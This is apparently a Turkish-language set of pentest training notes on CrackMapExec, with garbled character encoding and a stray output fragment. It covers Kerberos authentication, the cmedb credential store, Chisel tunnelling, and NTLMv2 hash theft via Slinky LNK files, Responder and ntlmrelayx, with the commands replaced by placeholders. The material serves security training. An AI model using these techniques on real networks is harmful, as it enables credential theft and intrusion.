### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

